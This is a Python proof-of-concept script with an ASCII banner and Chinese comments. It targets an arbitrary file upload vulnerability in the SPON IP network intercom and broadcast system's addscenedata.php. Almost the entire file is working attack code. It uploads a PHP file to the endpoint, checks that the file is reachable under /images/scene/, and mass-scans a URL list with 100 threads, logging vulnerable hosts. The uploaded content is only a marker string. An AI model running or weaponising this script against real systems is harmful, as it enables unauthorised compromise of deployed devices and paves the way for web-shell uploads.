#世邦通信SPON-IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    text = '''

 
███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      █████╗  ██████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██║   ██║██████╔╝██║     ███████║██║   ██║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔═══╝ ██║     ██╔══██║██║   ██║██║  ██║
██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗██║  ██║╚██████╔╝██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                ░                                ░        
                                                                version:SBTX_SPON_IP_Fileupload 1.0
                                                                Author: Laow🚦
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="世邦通信SPON-IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/php/addscenedata.php'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", 
        "Content-Type": "multipart/form-data; boundary=b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b", 
        "Accept-Encoding": "gzip, deflate, br"
        }
    data = "--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n6666\r\n--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b--"
    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5)
        payload2 = "/images/scene/test.php" #上传成功要访问的上传文件路径
        url2 = target + payload2
        response2 = requests.get(url=url2)
        # print(response.text)
        if response.status_code == 200 and "6666" in response2.text:
            print( f"{GREEN}[+] {target} 存在文件上传漏洞！\n  {url2} {RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass


        
if __name__ == '__main__':
    main()
